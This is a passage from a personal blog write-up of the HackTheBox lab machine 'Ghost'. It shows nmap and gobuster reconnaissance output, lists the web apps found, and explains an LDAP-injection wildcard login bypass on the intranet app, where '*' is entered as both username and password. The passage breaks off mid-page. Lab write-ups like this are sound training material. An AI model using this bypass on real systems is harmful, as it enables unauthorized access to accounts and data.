<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- iOS Safari -->
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- Chrome, Firefox OS and Opera Status Bar Color -->
<meta name="theme-color" content="#FFFFFF">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
<link rel="stylesheet" type="text/css"
  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
<link rel="stylesheet" type="text/css" href="css/theme.css">
<link rel="stylesheet" type="text/css" href="css/notablog.css">
<!-- Favicon -->

  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">

<style>
  :root {
    font-size: 20px;
  }
</style>
  <title>HTB Machine — Ghost&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
  <meta property="og:type" content="blog">
  <meta property="og:title" content="HTB Machine — Ghost">
  
    <meta name="description" content="Ghost is the toughest box I’ve faced so far, it took me weeks to complete (and much longer to create this writeup). It involves exploiting and pivoting between several interconnected web apps, Linux containers and an AD forest environment. Many AD services and attacks are still new to me, so I often found myself getting stuck. This is especially true for ticket-based attacks, understanding the entire flow and interaction can be quite a head-scratcher.">
    <meta property="og:description" content="Ghost is the toughest box I’ve faced so far, it took me weeks to complete (and much longer to create this writeup). It involves exploiting and pivoting between several interconnected web apps, Linux containers and an AD forest environment. Many AD services and attacks are still new to me, so I often found myself getting stuck. This is especially true for ticket-based attacks, understanding the entire flow and interaction can be quite a head-scratcher.">
  
  
    <meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/38f90738d0433b8adf27036f18ecf91e.png">
  
  <style>
    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
  <a href="/">
    <div class="Navbar__Btn">
      
        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
      
      <span>Home</span>
    </div>
  </a>
  <span class="Navbar__Delim">&centerdot;</span>
  <a href="https://github.com/ch3ng625", target="_blank">
    <div class="Navbar__Btn">
      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
      <span>GitHub</span>
    </div>
  </a>
  <span class="Navbar__Delim">&centerdot;</span>
  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
    <div class="Navbar__Btn">
      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
      <span>LinkedIn</span>
    </div>
  </a>
  <span class="Navbar__Delim">&centerdot;</span>
  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
    <div class="Navbar__Btn">
      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
      <span>HackTheBox</span>
    </div>
  </a>
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
</nav>

  <header class="Header">
    
    <div class="Header__Spacer Header__Spacer--NoCover">
    </div>
    
      <div class="Header__Icon">
        <span><img class="inline-img-icon" src="https://labs.hackthebox.com/storage/avatars/38f90738d0433b8adf27036f18ecf91e.png"></span>
      </div>
    
    <h1 class="Header__Title">HTB Machine — Ghost</h1>
    
      <div class="DateTagBar">
        
          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sun, May 25, 2025</span>
        
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
            <a href="tag/HTB">HTB</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
            <a href="tag/Windows">Windows</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--purple">
            <a href="tag/Insane">Insane</a>
          </span>
        
      </div>
    
  </header>
  <article id="https://www.notion.so/1fe0b98a88f78027b818ea6f98b8c3ca" class="PageRoot"><h3 id="https://www.notion.so/1fe0b98a88f780c08126c2ea064a5be6" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1fe0b98a88f780c08126c2ea064a5be6"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/1fe0b98a88f78037aa50c07dd2d8d882" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Ghost is the toughest box I’ve faced so far, it took me weeks to complete (and much longer to create this writeup). It involves exploiting and pivoting between several interconnected web apps, Linux containers and an AD forest environment. Many AD services and attacks are still new to me, so I often found myself getting stuck. This is especially true for ticket-based attacks, understanding the entire flow and interaction can be quite a head-scratcher.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780f19b6fd87d401a4cd1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f7801b9ecec61e514b73f3" class="Divider"></div><h3 id="https://www.notion.so/1fe0b98a88f780f28557cc02ae6b1dd9" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1fe0b98a88f780f28557cc02ae6b1dd9"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/1fe0b98a88f780e2b290ff143d85f752" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f7802185eaefe43de0af5e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 10.129.231.105

Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 18:13 ACDT
Nmap scan report for 10.129.231.105
Host is up (0.34s latency).
Not shown: 65508 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8008/tcp  open  http
8443/tcp  open  https-alt
9389/tcp  open  adws
49443/tcp open  unknown
49664/tcp open  unknown
49669/tcp open  unknown
49677/tcp open  unknown
51774/tcp open  unknown
60249/tcp open  unknown
60388/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 199.07 seconds

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 53,80,88,135,139,389,443,445,464,593,636,1433,2179,3268,3269,3389,5985,8008,8443,9389,49443,49664,49669,49677,51774,60249,60388 10.129.231.105

Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 18:23 ACDT
Nmap scan report for 10.129.231.105
Host is up (0.34s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-14 07:53:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
443/tcp   open  https?
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.231.105:1433: 
|     Target_Name: GHOST
|     NetBIOS_Domain_Name: GHOST
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: ghost.htb
|     DNS_Computer_Name: DC01.ghost.htb
|     DNS_Tree_Name: ghost.htb
|_    Product_Version: 10.0.20348
|_ssl-date: 2025-01-14T07:55:24+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.129.231.105:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-14T07:41:07
|_Not valid after:  2055-01-14T07:41:07
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GHOST
|   NetBIOS_Domain_Name: GHOST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ghost.htb
|   DNS_Computer_Name: DC01.ghost.htb
|   DNS_Tree_Name: ghost.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2025-01-14T07:54:49+00:00
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Not valid before: 2025-01-13T07:38:19
|_Not valid after:  2025-07-15T07:38:19
|_ssl-date: 2025-01-14T07:55:24+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8008/tcp  open  http          nginx 1.18.0 (Ubuntu)
|_http-title: Ghost
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-generator: Ghost 5.78
| http-robots.txt: 5 disallowed entries 
|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
8443/tcp  open  ssl/http      nginx 1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: commonName=core.ghost.htb
| Subject Alternative Name: DNS:core.ghost.htb
| Not valid before: 2024-06-18T15:14:02
|_Not valid after:  2124-05-25T15:14:02
| tls-alpn: 
|_  http/1.1
| http-title: Ghost Core
|_Requested resource was /login
|_http-server-header: nginx/1.18.0 (Ubuntu)
9389/tcp  open  mc-nmf        .NET Message Framing
49443/tcp open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51774/tcp open  msrpc         Microsoft Windows RPC
60249/tcp open  msrpc         Microsoft Windows RPC
60388/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-14T07:54:51
|_  start_date: N/A

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   349.55 ms 10.10.14.1
2   343.20 ms 10.129.231.105

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.79 seconds</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780acabf3c7106ce5e3df" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The scan results are typical of a domain controller, with DNS, Kerberos, SMB and LDAP all open. RDP and WInRM ports are also open, which could be leveraged for initial access. The LDAP scan identified the hostname </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dc01.ghost.htb</code></span><span class="SemanticString">, and a subdomain </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">core.ghost.htb</code></span><span class="SemanticString"> was also found in the SSL cert of a web server.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780baad12f5d7e6314988" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll add all of them in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780ab94d3edae2eed5a16" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># HTB machine Ghost</span>
<span class="token number">10.129</span>.231.105  ghost.htb   dc01.ghost.htb  core.ghost.htb</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780f79c72e4db3ab72a33" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Speaking of web servers, looks like there’s 4 in total! Two of them are running Nginx with an Ubuntu label, which suggests that they are hosted inside Linux containers.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780879313cbec197ab5bc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f7804597d8dc04e9a62971" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Web Apps Overview:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780cdaeb9dee5a2616739" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Port 80 returned a 404, while port 443 never responded.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780ed8d97f6cb805615fd" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/port80_404.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/port80_404.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f78088abfdc72ce2721525" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Port 8008 is a Ghost CMS page, with a single post by </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Kathryn Holland</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780788996d98947504d5c" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/port80_ghostcms.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/port80_ghostcms.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f78032be74c454a7ffcd67" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Running a VHost scan would identify two more subdomains: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">gitea</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">intranet</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780be800defe752511000" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> sudo gobuster vhost -u http://ghost.htb:8008 -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 50 -o bust/vhost_bq --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://ghost.htb:8008
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/namelist.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: gitea.ghost.htb:8008 Status: 200 [Size: 13653]
Found: intranet.ghost.htb:8008 Status: 307 [Size: 3968] [--&gt; /login]</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780e6a6b1dd341e3f051d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">gitea.ghost.htb</code></span><span class="SemanticString"> is a standard Gitea installation with two users. Not much could be done without valid creds.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7809a8a28d956e0910aab" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/gitea_home.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/gitea_home.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f780109e8bf2c98c254241" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/gitea_users.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/gitea_users.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f7804ab6bce943b20e9edb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">intranet.ghost.htb</code></span><span class="SemanticString"> looks like a custom-built app, but also requires authentication.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78079a160dc8063d8f2d1" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/intranet_login.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/intranet_login.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f78030842be804fd76bba9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">core.ghost.htb</code></span><span class="SemanticString"> on port 8443 is another custom-built application. Authentication is handled by AD Federation Service.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7805c8a8ccdcd4f2e927d" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_home.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_home.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f780ffa8bac8a50751f779" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Clicking on Login redirects me to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">federation.ghost.htb</code></span><span class="SemanticString">, which can be accessed after adding the subdomain to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">. It is yet another login page.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7803b8f92fafb33a2d8fa" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/adfs_login.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/adfs_login.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f780cfb92dfe3768f7f1f6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The app is using SAML authentication, based on the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SAMLRequest</code></span><span class="SemanticString"> parameter. </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://learn.microsoft.com/en-us/entra/identity-platform/single-sign-on-saml-protocol">SAML</a></span><span class="SemanticString"> is an XML-based standard for Single Sign-On (SSO), and when used with ADFS, it enables users to authenticate directly with their domain account.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7800883c3f74aef49b751" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In general, this type of authentication is more secure than password-based ones, as it’s very difficult to forge/bypass without control of ADFS.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780ad9017e4ea777e4a3a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f78022b4cefed964360abc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP8008 — Intranet</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7809bb43bf2a4cfd7cdbd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Custom apps are often the easiest entrypoint, so I’ll start with Intranet first.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7804e8f78f1039819bcbe" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/intranet_invalid_login.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/intranet_invalid_login.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f7803293c6ea08d4e4aa68" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I tried logging in with a few default credentials, but it all failed. However, the POST request showed something interesting.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780129fb5d97d6613d9f8" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/intranet_login_POST.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/intranet_login_POST.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f7802594afe9e09ed90fb6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The parameters for username and password are </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">1_ldap-username</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">1_ldap-secret</code></span><span class="SemanticString"> respectively, suggesting that credentials are stored in LDAP instead of a database, and each login request would query LDAP to compare the credentials.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7803a9ed8c16eaeae5edc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f78045a192d860be2d8ed0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">LDAP Wildcard Abuse:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7804bacfddbe05e02b912" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">If the username and password are used directly in the LDAP query, the application is highly likely to be vulnerable to LDAP injection. A pretty well-known example of this is wildcard abuse, where an attacker inputs a wildcard character (</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">*</code></span><span class="SemanticString">) to bypass all filters or validation checks implemented on the backend.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7809db2b8d44dd0ee39f3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In the login POST request, by setting both the username and password as an asterisk, the server is tricked to authenticate me and returned a session token.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780bc99d4f030e7cd4629" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/intranet_ldap_inject.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/intranet_ldap_inject.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f780649096dfe3ba95c5da" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Using the token, I can log in to Intranet as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">kathryn.holland</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78078a38bd1e1a757f723" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/intranet_home.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/intranet_home.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f780f0afbacc6d672e3874" class="ColorfulBlock 